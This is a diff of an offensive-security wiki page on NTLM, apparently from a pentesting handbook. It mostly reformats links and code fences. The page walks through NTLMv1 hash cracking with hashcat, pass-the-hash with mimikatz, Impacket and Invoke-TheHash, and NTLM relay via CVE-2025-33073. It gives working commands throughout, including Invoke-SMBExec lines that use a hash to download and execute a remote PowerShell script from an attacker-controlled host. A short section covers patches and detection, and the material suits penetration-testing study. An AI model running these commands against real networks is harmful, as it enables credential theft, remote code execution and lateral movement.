@@ -1,7 +1,5 @@
 # NTLM
 
-
-
 ## Basic Information
 
 In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
@@ -27,7 +25,7 @@ You can check and configure which protocol will be used:
 
 Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
 
-![[<../../images/image (919).png>|]]
+![[../../images/image (919).png]]
 
 ### Registry
 
@@ -36,7 +34,7 @@ This will set the level 5:
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-```
+
 Possible values:
 
 ```
@@ -47,7 +45,7 @@ Possible values:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
-```
+
 ## Basic NTLM Domain authentication Scheme
 
 1. The **user** introduces his **credentials**
@@ -85,18 +83,18 @@ You could abuse some credentials/sessions you already have on the AD to **ask th
 If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.\
 _Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([[#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example|more info here]].
+Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).
 
 ### NTLMv1 attack with hashcat
 
-NTLMv1 can also be broken with the NTLMv1 Multi Tool [[https://github.com/evilmog/ntlmv1-multi|https://github.com/evilmog/ntlmv1-multi]] which formats NTLMv1 messages im a method that can be broken with hashcat.
+NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
 
 The command
 
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-```
+
 would output the below:
 
 ```bash
@@ -124,20 +122,20 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-```
+
 Create a file with the contents of:
 
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-```
+
 Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
 
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-```
+
 In this case we know the password to this is password so we are going to cheat for demo purposes:
 
 ```bash
@@ -148,7 +146,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-```
+
 We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
 
 ```bash
@@ -158,7 +156,7 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-```
+
 Ginally the last part:
 
 ```bash
@@ -166,13 +164,13 @@ Ginally the last part:
 
 586c # this is the last part
 ```
-```
+
 Combine them together:
 
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
-```
+
 ### NTLMv2 Challenge
 
 The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
@@ -181,7 +179,7 @@ The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 by
 
 The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
 
-If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [[https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/|https://research.801labs.org/cracking-an-ntlmv2-hash/]]
+If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
@@ -197,17 +195,17 @@ You need to use a **tool** that will **perform** the **NTLM authentication using
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-```
+
 This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).
 
 ### Pass-the-Hash from linux
 
 You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
-[[https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md|**Access here to learn how to do it.**]]
+[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)
 
 ### Impacket Windows compiled tools
 
-You can download[[https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries| impacket binaries for Windows here]].
+You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
@@ -216,32 +214,32 @@ You can download[[https://github.com/ropnop/impacket_static_binaries/releases/ta
 
 ### Invoke-TheHash
 
-You can get the powershell scripts from here: [[https://github.com/Kevin-Robertson/Invoke-TheHash|https://github.com/Kevin-Robertson/Invoke-TheHash]]
+You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
 
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-```
+
 #### Invoke-WMIExec
 
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-```
+
 #### Invoke-SMBClient
 
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
-```
+
 #### Invoke-SMBEnum
 
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
-```
+
 #### Invoke-TheHash
 
 This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
@@ -249,8 +247,8 @@ This function is a **mix of all the others**. You can pass **several hosts**, **
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
-```
-### [[../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm|Evil-WinRM Pass the Hash]]
+
+### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
 ### Windows Credentials Editor (WCE)
 
@@ -261,14 +259,14 @@ This tool will do the same thing as mimikatz (modify LSASS memory).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-```
+
 ### Manual Windows remote execution with username and password
 
 [[../lateral-movement/]]
 
 ## Extracting credentials from a Windows Host
 
-**For more information about** [[https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md|**how to obtain credentials from a Windows host you should read this page**]]**.**
+**For more information about** [**how to obtain credentials from a Windows host you should read this page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
 ## Internal Monologue attack
 
@@ -280,7 +278,7 @@ If NetNTLMv1 is not accepted—due to enforced security policies, then the attac
 
 To handle this case, the Internal Monologue tool was updated: It dynamically acquires a server token using `AcceptSecurityContext()` to still **capture NetNTLMv2 responses** if NetNTLMv1 fails. While NetNTLMv2 is much harder to crack, it still opens a path for relay attacks or offline brute-force in limited cases.
 
-The PoC can be found in **[[https://github.com/eladshamir/Internal-Monologue|https://github.com/eladshamir/Internal-Monologue]]**.
+The PoC can be found in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.
 
 ## NTLM Relay and Responder
 
@@ -290,7 +288,7 @@ The PoC can be found in **[[https://github.com/eladshamir/Internal-Monologue|htt
 
 ## Parse NTLM challenges from a network capture
 
-**You can use** [[https://github.com/mlgualtieri/NTLMRawUnHide|**https://github.com/mlgualtieri/NTLMRawUnHide**]]
+**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 ## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
 
@@ -324,7 +322,7 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 # Relay listener (Kerberos) – remove NTLM mechType first
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
-```
+
 ### Patch & Mitigations
 * KB patch for **CVE-2025-33073** adds a check in `mrxsmb.sys::SmbCeCreateSrvCall` that blocks any SMB connection whose target contains marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
 * Enforce **SMB signing** to prevent reflection even on unpatched hosts.
@@ -336,6 +334,6 @@ krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 * Windows Event 4624/4648 SYSTEM logons immediately followed by remote SMB writes from the same host.
 
 ## References
-* [[https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html|NTLM Reflection is Dead, Long Live NTLM Reflection!]]
-* [[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073|MSRC – CVE-2025-33073]]
+* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
+* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 
